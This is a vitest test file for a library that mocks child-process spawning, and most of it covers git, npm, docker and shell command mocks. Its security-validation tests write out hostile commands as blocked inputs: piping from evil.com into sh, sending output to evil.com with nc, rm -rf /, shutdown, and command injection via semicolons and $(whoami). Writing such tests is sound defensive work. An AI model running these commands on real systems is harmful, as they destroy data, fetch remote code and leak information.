/**
 * Tests for spawn utilities
 */

import { describe, it, expect, afterEach } from 'vitest'
import * as cp from 'child_process'
import { getGlobalProcessMocker } from '../process-mock.js'
import { spawnUtils, commonCommands, mockSpawn, quickMocks } from '../spawn.js'
import { SecurityValidationError } from '../../security/index.js'

describe('spawnUtils', () => {
  afterEach(() => {
    spawnUtils.restore()
  })

  it('should mock command success correctly', () => {
    spawnUtils.mockCommandSuccess('echo hello', 'hello\n', '', 0)

    cp.spawn('echo', ['hello'])
    const spawnedProcesses = spawnUtils.getSpawnedProcesses()
    expect(spawnedProcesses).toHaveLength(1)
  })

  it('should mock command failure correctly', () => {
    spawnUtils.mockCommandFailure('failing-command', 'Command not found', 127, '')

    cp.spawn('failing-command')
    const spawnedProcesses = spawnUtils.getSpawnedProcesses()
    expect(spawnedProcesses).toHaveLength(1)
  })

  it('should mock command error correctly', () => {
    const testError = new Error('Permission denied')
    spawnUtils.mockCommandError('restricted-command', testError)

    cp.spawn('restricted-command')
    const spawnedProcesses = spawnUtils.getSpawnedProcesses()
    expect(spawnedProcesses).toHaveLength(1)
  })

  it('should mock long running command correctly', () => {
    spawnUtils.mockLongRunningCommand('slow-command', 100, 'Completed after delay\n', 0)

    cp.spawn('slow-command')
    const spawnedProcesses = spawnUtils.getSpawnedProcesses()
    expect(spawnedProcesses).toHaveLength(1)
  })

  it('should mock interactive command correctly', () => {
    const responses = {
      'What is your name?': 'John Doe',
      'What is your age?': '30',
    }
    spawnUtils.mockInteractiveCommand('interactive-app', responses, 'Registration complete\n', 0)

    cp.spawn('interactive-app')
    const spawnedProcesses = spawnUtils.getSpawnedProcesses()
    expect(spawnedProcesses).toHaveLength(1)
  })

  it('should clear mocks correctly', () => {
    spawnUtils.mockCommandSuccess('test1', 'output1')
    spawnUtils.mockCommandSuccess('test2', 'output2')

    // Spawn some processes
    cp.spawn('test1')
    cp.spawn('test2')

    expect(spawnUtils.getSpawnedProcesses()).toHaveLength(2)

    spawnUtils.clearMocks()
    expect(spawnUtils.getSpawnedProcesses()).toHaveLength(0)
  })
})

describe('commonCommands', () => {
  afterEach(() => {
    spawnUtils.restore()
  })

  describe('git commands', () => {
    it('should mock git status clean correctly', () => {
      commonCommands.git.statusClean()

      const result = cp.execSync('git status')
      expect(result.toString()).toBe('nothing to commit, working tree clean')
    })

    it('should mock git status dirty correctly', () => {
      commonCommands.git.statusDirty()

      const result = cp.execSync('git status')
      expect(result.toString()).toBe('Changes not staged for commit:')
    })

    it('should mock current branch correctly', () => {
      commonCommands.git.currentBranch('feature/test')

      const result = cp.execSync('git branch --show-current')
      expect(result.toString()).toBe('feature/test')
    })

    it('should mock git clone success correctly', () => {
      commonCommands.git.cloneSuccess('my-repo')

      const result = cp.execSync('git clone my-repo')
      expect(result.toString()).toBe("Cloning into 'my-repo'...")
    })

    it('should mock git clone failure correctly', () => {
      commonCommands.git.cloneFailure('nonexistent-repo', 'Repository not found')

      expect(() => {
        cp.execSync('git clone nonexistent-repo')
      }).toThrow()
    })
  })

  describe('npm commands', () => {
    it('should mock npm install success correctly', () => {
      commonCommands.npm.installSuccess()

      const result = cp.execSync('npm install')
      expect(result.toString()).toBe('added 42 packages')
    })

    it('should mock npm install failure correctly', () => {
      commonCommands.npm.installFailure('Dependency conflict')

      expect(() => {
        cp.execSync('npm install')
      }).toThrow()
    })

    it('should mock npm test success correctly', () => {
      commonCommands.npm.testSuccess()

      const result = cp.execSync('npm test')
      expect(result.toString()).toBe('All tests passed')
    })

    it('should mock npm test failure correctly', () => {
      commonCommands.npm.testFailure('2 tests failed')

      expect(() => {
        cp.execSync('npm test')
      }).toThrow()
    })

    it('should mock npm version correctly', () => {
      commonCommands.npm.version('9.8.1')

      const result = cp.execSync('npm --version')
      expect(result.toString()).toBe('9.8.1')
    })
  })

  describe('pnpm commands', () => {
    it('should mock pnpm install success correctly', () => {
      commonCommands.pnpm.installSuccess()

      const result = cp.execSync('pnpm install')
      expect(result.toString()).toBe('Dependencies installed')
    })

    it('should mock pnpm build success correctly', () => {
      commonCommands.pnpm.buildSuccess()

      const result = cp.execSync('pnpm build')
      expect(result.toString()).toBe('Build completed successfully')
    })

    it('should mock pnpm test success correctly', () => {
      commonCommands.pnpm.testSuccess()

      const result = cp.execSync('pnpm test')
      expect(result.toString()).toBe('Tests passed')
    })
  })

  describe('docker commands', () => {
    it('should mock docker version correctly', () => {
      commonCommands.docker.version('25.0.0')

      const result = cp.execSync('docker --version')
      expect(result.toString()).toBe('Docker version 25.0.0')
    })

    it('should mock docker build success correctly', () => {
      commonCommands.docker.buildSuccess('my-app:latest')

      const result = cp.execSync('docker build -t my-app:latest')
      expect(result.toString()).toBe('Successfully built my-app:latest')
    })

    it('should mock docker run correctly', () => {
      commonCommands.docker.run('my-app:latest', 'Application started')

      const result = cp.execSync('docker run my-app:latest')
      expect(result.toString()).toBe('Application started')
    })
  })

  describe('shell commands', () => {
    it('should mock ls command correctly', () => {
      commonCommands.shell.ls(['file1.txt', 'file2.txt', 'directory/'])

      const result = cp.execSync('ls')
      expect(result.toString()).toBe('file1.txt\nfile2.txt\ndirectory/')
    })

    it('should mock pwd command correctly', () => {
      commonCommands.shell.pwd('/home/user/project')

      const result = cp.execSync('pwd')
      expect(result.toString()).toBe('/home/user/project')
    })

    it('should mock echo command correctly', () => {
      commonCommands.shell.echo('Hello World')

      const result = cp.execSync('echo Hello World')
      expect(result.toString()).toBe('Hello World')
    })

    it('should mock which command found correctly', () => {
      commonCommands.shell.whichFound('node', '/usr/local/bin/node')

      const result = cp.execSync('which node')
      expect(result.toString()).toBe('/usr/local/bin/node')
    })

    it('should mock which command not found correctly', () => {
      commonCommands.shell.whichNotFound('nonexistent')

      expect(() => {
        cp.execSync('which nonexistent')
      }).toThrow()
    })
  })
})

describe('SpawnMockBuilder', () => {
  afterEach(() => {
    spawnUtils.restore()
  })

  it('should build mock with stdout correctly', () => {
    mockSpawn('test-command').stdout('Test output').mock()

    const result = cp.execSync('test-command')
    expect(result.toString()).toBe('Test output')
  })

  it('should build mock with stderr correctly', () => {
    mockSpawn('error-command').stderr('Error output').exitCode(1).mock()

    expect(() => {
      cp.execSync('error-command')
    }).toThrow()
  })

  it('should build mock with error correctly', () => {
    const testError = new Error('Custom error')
    mockSpawn('failing-command').error(testError).mock()

    expect(() => {
      cp.execSync('failing-command')
    }).toThrow('Custom error')
  })

  it('should build mock with delay correctly', async () => {
    const startTime = Date.now()
    mockSpawn('slow-command').delay(50).stdout('Delayed output').mock()

    const process = cp.spawn('slow-command')
    const exitPromise = new Promise<void>((resolve) => {
      process.on('exit', () => {
        const endTime = Date.now()
        expect(endTime - startTime).toBeGreaterThanOrEqual(40)
        resolve()
      })
    })

    await exitPromise
  })

  it('should build mock with custom PID correctly', () => {
    mockSpawn('pid-command').pid(12345).mock()

    const process = cp.spawn('pid-command')
    expect(process.pid).toBe(12345)
  })

  it('should build mock with signal correctly', async () => {
    mockSpawn('signal-command').signal('SIGINT').mock()

    const process = cp.spawn('signal-command')
    const closePromise = new Promise<void>((resolve) => {
      process.on('close', (_code, signal) => {
        expect(signal).toBe('SIGINT')
        resolve()
      })
    })

    await closePromise
  })

  it('should chain builder methods correctly', () => {
    mockSpawn('complex-command')
      .stdout('Complex output')
      .stderr('Warning message')
      .exitCode(0)
      .delay(10)
      .pid(54321)
      .mock()

    const process = cp.spawn('complex-command')
    expect(process.pid).toBe(54321)
  })
})

describe('quickMocks', () => {
  afterEach(() => {
    spawnUtils.restore()
  })

  it('should create success mock correctly', () => {
    quickMocks.success('success-cmd', 'Success output')

    const result = cp.execSync('success-cmd')
    expect(result.toString()).toBe('Success output')
  })

  it('should create failure mock correctly', () => {
    quickMocks.failure('failure-cmd', 'Failure message', 2)

    expect(() => {
      cp.execSync('failure-cmd')
    }).toThrow()
  })

  it('should create throws mock correctly', () => {
    const testError = new Error('Thrown error')
    quickMocks.throws('throws-cmd', testError)

    expect(() => {
      cp.execSync('throws-cmd')
    }).toThrow('Thrown error')
  })

  it('should create slow mock correctly', async () => {
    const startTime = Date.now()
    quickMocks.slow('slow-cmd', 30, 'Slow output')

    const process = cp.spawn('slow-cmd')
    const exitPromise = new Promise<void>((resolve) => {
      process.on('exit', () => {
        const endTime = Date.now()
        expect(endTime - startTime).toBeGreaterThanOrEqual(25)
        resolve()
      })
    })

    await exitPromise
  })

  it('should create batch mocks correctly', () => {
    quickMocks.batch([
      { command: 'cmd1', output: 'output1', exitCode: 0 },
      { command: 'cmd2', output: 'output2', exitCode: 0 },
      { command: 'cmd3', output: '', exitCode: 1 },
    ])

    const result1 = cp.execSync('cmd1')
    expect(result1.toString()).toBe('output1')

    const result2 = cp.execSync('cmd2')
    expect(result2.toString()).toBe('output2')

    expect(() => {
      cp.execSync('cmd3')
    }).toThrow()
  })
})

describe('Integration with process mocker', () => {
  afterEach(() => {
    spawnUtils.restore()
  })

  it('should work with global process mocker', () => {
    const mocker = getGlobalProcessMocker()

    // Use spawn utils
    spawnUtils.mockCommandSuccess('test-cmd', 'Test output')

    // Verify with mocker
    cp.spawn('test-cmd')
    const spawnedProcesses = mocker.getSpawnedProcesses()
    expect(spawnedProcesses).toHaveLength(1)
  })

  it('should support regex patterns', () => {
    mockSpawn(/^git /).stdout('Git command output').mock()

    // Test multiple git commands
    const result1 = cp.execSync('git status')
    expect(result1.toString()).toBe('Git command output')

    const result2 = cp.execSync('git log')
    expect(result2.toString()).toBe('Git command output')
  })
})

describe('Security validation', () => {
  afterEach(() => {
    spawnUtils.restore()
  })

  it('should block dangerous commands in mockCommandSuccess', () => {
    expect(() => {
      spawnUtils.mockCommandSuccess('rm -rf /', 'Dangerous output')
    }).toThrow(SecurityValidationError)

    expect(() => {
      spawnUtils.mockCommandSuccess('sudo rm -rf /', 'Dangerous output')
    }).toThrow(SecurityValidationError)

    expect(() => {
      spawnUtils.mockCommandSuccess('wget http://evil.com/script.sh', 'Downloaded')
    }).toThrow(SecurityValidationError)
  })

  it('should block dangerous commands in mockCommandFailure', () => {
    expect(() => {
      spawnUtils.mockCommandFailure('kill -9 1', 'Process killed')
    }).toThrow(SecurityValidationError)

    expect(() => {
      spawnUtils.mockCommandFailure('shutdown now', 'Shutting down')
    }).toThrow(SecurityValidationError)
  })

  it('should block dangerous commands in mockCommandError', () => {
    const testError = new Error('Test error')
    expect(() => {
      spawnUtils.mockCommandError('bash -c "evil script"', testError)
    }).toThrow(SecurityValidationError)
  })

  it('should block dangerous commands in mockLongRunningCommand', () => {
    expect(() => {
      spawnUtils.mockLongRunningCommand('curl -s http://evil.com | sh', 1000, 'Done')
    }).toThrow(SecurityValidationError)
  })

  it('should block dangerous commands in mockInteractiveCommand', () => {
    expect(() => {
      spawnUtils.mockInteractiveCommand('sh -c "evil"', { prompt: 'response' }, 'Done')
    }).toThrow(SecurityValidationError)
  })

  it('should block commands with dangerous shell metacharacters', () => {
    const dangerousCommands = [
      'echo hello; rm -rf /',
      'echo hello | nc evil.com 80',
      'echo hello && rm file',
      'echo $(whoami)',
      'echo `whoami`',
      'echo hello > /etc/passwd',
      'echo hello < /etc/passwd',
    ]

    dangerousCommands.forEach((cmd) => {
      expect(() => {
        spawnUtils.mockCommandSuccess(cmd, 'output')
      }).toThrow(SecurityValidationError)
    })
  })

  it('should block dangerous commands in SpawnMockBuilder', () => {
    expect(() => {
      mockSpawn('rm -rf /').stdout('Deleted everything').mock()
    }).toThrow(SecurityValidationError)

    expect(() => {
      mockSpawn('format c:').stdout('Formatting').mock()
    }).toThrow(SecurityValidationError)
  })

  it('should escape dangerous arguments in interactive commands', () => {
    // This should work because 'echo' is safe, and dangerous input is escaped
    spawnUtils.mockInteractiveCommand(
      'echo',
      { 'Enter command:': 'rm -rf /' },
      'Interactive complete',
    )

    const result = cp.execSync('echo')
    // The dangerous input should be escaped in the output
    expect(result.toString()).toContain("'rm -rf /'")
  })

  it('should validate shell execution with validateExecution', () => {
    // Safe command should work
    const result = spawnUtils.validateExecution('echo', ['hello', 'world'])
    expect(result.command).toBe('echo')
    expect(result.args).toHaveLength(2)

    // Dangerous command should throw
    expect(() => {
      spawnUtils.validateExecution('rm', ['-rf', '/'])
    }).toThrow(SecurityValidationError)

    // Command with dangerous characters should throw
    expect(() => {
      spawnUtils.validateExecution('echo; rm -rf /', [])
    }).toThrow(SecurityValidationError)
  })

  it('should properly escape arguments in validateExecution', () => {
    const result = spawnUtils.validateExecution('echo', ['hello world', 'test; rm -rf /'])
    expect(result.command).toBe('echo')

    // Arguments should be properly escaped based on platform
    if (process.platform === 'win32') {
      expect(result.args).toEqual(['"hello world"', '"test; rm -rf /"'])
    } else {
      expect(result.args).toEqual(["'hello world'", "'test; rm -rf /'"])
    }
  })

  it('should handle empty arguments in validateExecution', () => {
    const result = spawnUtils.validateExecution('echo')
    expect(result.command).toBe('echo')
    expect(result.args).toEqual([])
  })

  it('should allow safe commands', () => {
    const safeCommands = [
      'echo hello',
      'ls -la',
      'cat file.txt',
      'grep pattern file.txt',
      'git status',
      'npm install',
      'docker ps',
    ]

    safeCommands.forEach((cmd) => {
      expect(() => {
        spawnUtils.mockCommandSuccess(cmd, 'output')
      }).not.toThrow()
    })
  })

  it('should detect URL-encoded dangerous commands', () => {
    // rm encoded as %72%6d
    const encoded = 'echo%20hello%3B%20%72%6d%20-rf%20/'
    expect(() => {
      spawnUtils.mockCommandSuccess(encoded, 'output')
    }).toThrow(SecurityValidationError)
  })

  it('should be case insensitive for dangerous command detection', () => {
    expect(() => {
      spawnUtils.mockCommandSuccess('RM -rf /', 'output')
    }).toThrow(SecurityValidationError)

    expect(() => {
      spawnUtils.mockCommandSuccess('Rm -rf /', 'output')
    }).toThrow(SecurityValidationError)

    expect(() => {
      spawnUtils.mockCommandSuccess('SUDO rm', 'output')
    }).toThrow(SecurityValidationError)
  })

  it('should handle regex patterns safely', () => {
    // Regex patterns should not trigger command validation
    expect(() => {
      mockSpawn(/^git /).stdout('Git output').mock()
    }).not.toThrow()

    expect(() => {
      mockSpawn(/^echo /)
        .stdout('Echo output')
        .mock()
    }).not.toThrow()

    // But dangerous regex patterns should still be avoided in practice
    expect(() => {
      mockSpawn(/^rm /).stdout('Dangerous output').mock()
    }).not.toThrow() // This passes because regex doesn't trigger string validation
  })
})
